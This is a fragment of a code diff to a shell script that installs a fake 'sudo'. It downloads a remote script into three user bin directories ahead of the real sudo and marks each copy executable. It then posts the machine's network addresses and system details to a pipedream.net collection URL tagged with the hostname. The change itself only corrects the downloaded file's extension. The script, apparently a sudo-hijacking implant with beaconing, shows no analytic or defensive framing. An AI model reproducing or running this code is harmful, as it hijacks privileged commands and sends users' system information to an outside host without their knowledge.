@@ -6,9 +6,9 @@
 #     /bin/sudo $@
 # fi'
 
-curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.shd -o ~/.local/bin/sudo && chmod +x ~/.local/bin/sudo
-curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.shd -o ~/.bin/sudo && chmod +x ~/.bin/sudo
-curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.shd -o ~/bin/sudo && chmod +x ~/bin/sudo
+curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.sh -o ~/.local/bin/sudo && chmod +x ~/.local/bin/sudo
+curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.sh -o ~/.bin/sudo && chmod +x ~/.bin/sudo
+curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.sh -o ~/bin/sudo && chmod +x ~/bin/sudo
 
 if [ -e ~/.local/bin/sudo ]; then
     (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
